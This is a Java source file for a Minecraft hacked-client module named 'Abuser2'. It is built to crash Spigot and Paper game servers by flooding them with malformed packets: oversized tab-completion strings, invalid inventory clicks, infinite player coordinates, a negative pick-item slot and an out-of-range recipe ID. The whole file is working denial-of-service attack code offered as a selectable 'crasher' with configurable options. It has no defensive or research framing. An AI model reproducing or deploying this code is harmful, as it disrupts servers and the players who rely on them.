package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import java.util.Arrays;
import java.util.List;
import net.minecraft.network.protocol.game.ServerboundCommandSuggestionPacket;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;
import net.minecraft.network.protocol.game.ServerboundPickItemPacket;
import net.minecraft.network.protocol.game.ServerboundRecipeBookSeenRecipePacket;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.inventory.AbstractContainerMenu;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class Abuser2 implements Crasher {
    private static final String METHOD_NAME = "Abuser2";
    private boolean enabled = false;
    private final List<String> commands = Arrays.asList("msg", "minecraft:msg", "tell", "minecraft:tell", "tm", "teammsg", "minecraft:teammsg", "minecraft:w", "minecraft:me");

    public Abuser2() {
    }

    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        boolean tabException = args[3].equals("true");
        boolean buttonException = args[4].equals("true");
        boolean illegalPos = args[5].equals("true");
        boolean spigotException = args[6].equals("true");
        boolean slotException = args[7].equals("true");
        boolean recipeException = args[8].equals("true");
        this.setEnabled(true);
        AbstractContainerMenu containerMenu = mc.player.containerMenu;
        Int2ObjectArrayMap<ItemStack> int2ObjectArrayMap = new Int2ObjectArrayMap();
        int2ObjectArrayMap.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        msgHelper.sendMessage("Starting crashing with &f" + this.getName(), true);

        for(int i = 0; i < packets; ++i) {
            if (tabException) {
                this.commands.forEach((c) -> PacketHelper.send(new ServerboundCommandSuggestionPacket(0, c + bypassHelper.getNBTTagString(2000))));
            }

            if (buttonException) {
                PacketHelper.send(new ServerboundContainerClickPacket(containerMenu.containerId, containerMenu.getStateId(), 36, -1, ClickType.SWAP, containerMenu.getSlot(0).getItem().copy(), int2ObjectArrayMap));
            }

            if (illegalPos) {
                PacketHelper.send(new ServerboundMovePlayerPacket.Pos(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
            }

            if (spigotException) {
                PacketHelper.send(new ServerboundPickItemPacket(-1));
            }

            if (slotException) {
                PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 127, 0, ClickType.PICKUP_ALL, ItemStack.EMPTY, new Int2ObjectArrayMap()));
            }

            if (recipeException && protocol >= 768) {
                PacketHelper.send(new ServerboundRecipeBookSeenRecipePacket(new ResourceLocation(String.valueOf(Integer.MAX_VALUE))));
            }
        }

        if (recipeException && protocol < 768) {
            msgHelper.sendMessage("To use RecipeException you must be using &cVersion 1.21.3+ (Protocol: 768)&7, and your current protocol is &c" + protocol, true);
        }

        this.setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    public String getName() {
        return "Abuser2";
    }

    public boolean getEnabled() {
        return this.enabled;
    }

    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    public String getArgsUsage() {
        return "packets[10], tabException[true], buttonException[false], illegalPos[false], spigotException[false], slotException[false], recipeException[false]";
    }

    public List<OptionUtil> getOptions() {
        return List.of(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("TabException", OptionType.BOOLEAN), new OptionUtil("ButtonException", OptionType.BOOLEAN), new OptionUtil("IllegalPos", OptionType.BOOLEAN), new OptionUtil("SpigotException", OptionType.BOOLEAN), new OptionUtil("SlotException", OptionType.BOOLEAN), new OptionUtil("RecipeException", OptionType.BOOLEAN));
    }

    public String getDescription() {
        return "Exception Crasher [spigot/paper crasher]";
    }
}
